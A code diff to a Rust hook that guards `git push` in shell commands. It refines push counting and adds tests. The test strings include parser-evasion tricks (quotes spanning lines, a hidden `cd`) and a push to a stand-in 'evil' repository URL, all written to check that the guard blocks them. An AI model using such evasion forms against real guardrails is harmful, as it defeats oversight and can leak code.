@@ -8,8 +8,9 @@ use cadence_hooks_core::config::{self, AllowEntry, env_allow_entries, env_extra_
 use cadence_hooks_core::loop_analysis::{self, ChainAnalysis, LoopAnalysis};
 use cadence_hooks_core::push::push_locations;
 use cadence_hooks_core::shell::{
-    LOOP_PATTERN, LocatedSegment, git_push_segments, host_and_repo_from_url, looks_like_push_url,
-    parse_work_dir, runs_a_git_exec, segment_work_dirs, strip_group_wrappers, strip_quotes,
+    LOOP_PATTERN, LocatedSegment, git_push_count, git_push_segments, host_and_repo_from_url,
+    looks_like_push_url, parse_work_dir, runs_a_git_exec, segment_work_dirs, strip_group_wrappers,
+    strip_quotes,
 };
 use cadence_hooks_core::{Check, CheckResult, HookInput};
 use regex::Regex;
@@ -1212,10 +1213,16 @@ fn judge_push(input: &HookInput, walk: &PushWalk) -> CheckResult {
             // push carrying a git global (`git -C . push …`), which is
             // exactly the shape #554 was about — so take the larger of the
             // two counts rather than trusting either on its own.
+            //
+            // The segment count leaves out the copies the as-written reading
+            // of a span bash and zsh read apart adds ([`git_push_count`]):
+            // that reading repeats the whole command, and one push read twice
+            // there is not two (cameronsjo/cadence-hooks#1393 review). The
+            // shell-fed heredoc pushes are added on top.
             let push_count = strip_quotes(command)
                 .matches("git push")
                 .count()
-                .max(push_segments.len());
+                .max(git_push_count(command) + (push_segments.len() - top_level_segments));
             if push_count > 1 {
                 return CheckResult::block(
                     "🚫 git-guardrails: multiple git push commands — cannot verify targets\n   \
@@ -3157,6 +3164,23 @@ mod tests {
                     "a=(x)#; cd rf_; git push 'https://github.com/evil/x.git' main",
                     Block,
                 ),
+                // A quote that opens in the span and closes on a later line:
+                // the earlier readings cut it at the span's newline, so its
+                // closer opened a quote over the push, and the quoted `cd
+                // ../rf_` moved it. bash pairs the quotes; the push runs in
+                // `rm_`.
+                (
+                    "a=(x)#; cd rm_; echo \"a\ncd ../rf_\nb\"\ngit push origin main",
+                    Block,
+                ),
+                (
+                    "a=(x)#; cd rm_; echo 'a\ncd ../rf_\nb'\ngit push origin main",
+                    Block,
+                ),
+                // One push read three ways is one push, so the fallback for a
+                // command the chain parser rejects does not count it three
+                // times.
+                ("(( 1 #'\n))'\n))\ncd rf_; git push origin main", Allow),
                 // Controls, as on main.
                 ("cd rf_; git push origin main", Allow),
                 ("cd rf_; git push origin feat", Allow),
